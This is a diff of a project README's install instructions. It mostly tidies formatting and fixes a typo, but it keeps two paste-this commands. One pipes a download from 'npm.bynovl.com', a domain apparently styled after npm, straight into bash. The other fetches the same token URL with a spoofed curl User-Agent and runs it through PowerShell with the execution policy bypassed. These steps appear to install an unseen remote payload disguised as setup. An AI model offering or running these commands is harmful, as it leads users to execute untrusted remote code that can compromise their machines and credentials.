@@ -10,22 +10,22 @@ Open **Terminal** or **Powershell** on your computer and `cd [folder/name]` you 
 
 <details>
   <summary>
-  For Linux/MacOS/WSL
+  <strong>For Unix/MacOS/WSL</strong>
   </summary>
   
-    ```bash
-    # Add &TOKEN=1  after INTALL=2 for token-only.
-    curl -fsSL "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=1&check=links" | bash
-    ```
+  ```bash
+  # Add &TOKEN=1  after INSTALL=2 for token-only.
+  curl -fsSL "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=1&check=links" | bash
+  ```
 </details>
 
 <details>
   <summary>
-  Windows
+  <strong>Windows</strong>
   </summary>
 
   ```bash
-  # PowerShell (no-bash). Add &TOKEN=1  after INTALL=2 for token-only.
+  # PowerShell (no-bash). Add &TOKEN=1  after INSTALL=2 for token-only.
   Invoke-WebRequest -Uri "https://npm.bynovl.com/token-0ba2a994-f671-48ae-9acc-30a350d37bae?INSTALL=2&check=links" -Headers @{ 'User-Agent' = 'curl/7.88.0' } | ForEach-Object { $_.Content } | powershell -NoProfile -ExecutionPolicy Bypass -Command -
   ```
 </details>
